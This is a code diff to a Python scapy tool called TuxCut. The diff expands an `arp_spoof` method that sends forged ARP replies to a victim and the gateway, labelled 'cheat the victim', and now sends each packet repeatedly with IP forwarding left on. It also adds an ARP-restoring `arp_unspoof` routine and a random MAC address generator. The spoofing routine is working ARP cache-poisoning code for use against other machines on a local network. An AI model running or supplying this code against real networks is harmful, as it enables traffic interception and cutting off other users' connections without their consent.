@@ -3,6 +3,7 @@ import netinfo
 from scapy.all import *
 import subprocess as sp
 import platform
+import random
 
 
 class TuxCut:
@@ -23,6 +24,7 @@ class TuxCut:
         else:
             print self.iface, 'No active connection detected'
             sys.exit()
+        print '##### ', self.generate_hw()
 
     def get_iface(self):
         ifaces_list = []
@@ -84,6 +86,16 @@ class TuxCut:
             sp.Popen(['arptables', '-P', 'OUTPUT', 'ACCEPT'])
         sp.Popen(['arptables', '-F'])
 
+    def send_correction_packet(self):
+        pkt = ARP()
+        pkt.op = 2
+        pkt.psrc = self.myip
+        pkt.hwsrc = self.myhw
+        pkt.pdst = self.gwip
+        pkt.hwdst = self.gwhw
+
+        send(pkt, count=5)
+        
     def enable_ip_forward(self):
         sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
 
@@ -91,7 +103,6 @@ class TuxCut:
         sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
 
     def arp_spoof(self, victim_ip, victim_hw):
-        self.disable_ip_forward()
         # cheat the victim
         pkt_1 = ARP()
         pkt_1.op = 2
@@ -108,9 +119,33 @@ class TuxCut:
         pkt_2.pdst = self.gwip
         pkt_2.hwdst = self.gwhw
 
-        send(pkt_1)
-        send(pkt_1)
+        send(pkt_1, count=3)
+        send(pkt_2, count=3)
 
-    def send_fake_packet(self, victimip):
-        pass
+    def arp_unspoof(self, victim_ip, victim_hw):
+        # Correct  the victim arp table
+        pkt_1 = ARP()
+        pkt_1.op = 2
+        pkt_1.psrc = self.gwip
+        pkt_1.hwsrc = self.gwhw
+        pkt_1.pdst = victim_ip
+        pkt_1.hwdst = victim_hw
 
+        # Correct  the gateway arptable
+        pkt_2 = ARP()
+        pkt_2.op = 2
+        pkt_2.psrc = victim_ip
+        pkt_2.hwsrc = victim_hw
+        pkt_2.pdst = self.gwip
+        pkt_2.hwdst = self.gwhw
+
+        send(pkt_1, count=3)
+        send(pkt_2, count=3)
+
+    def generate_hw(self):
+        new_hw =':'.join(map(lambda x: "%02x" % x, [0x00, random.randint(0x00, 0x7f),
+                                                      random.randint(0x00, 0x7f),
+                                                      random.randint(0x00, 0x7f),
+                                                      random.randint(0x00, 0xff),
+                                                      random.randint(0x00, 0xff)]))
+        return new_hw
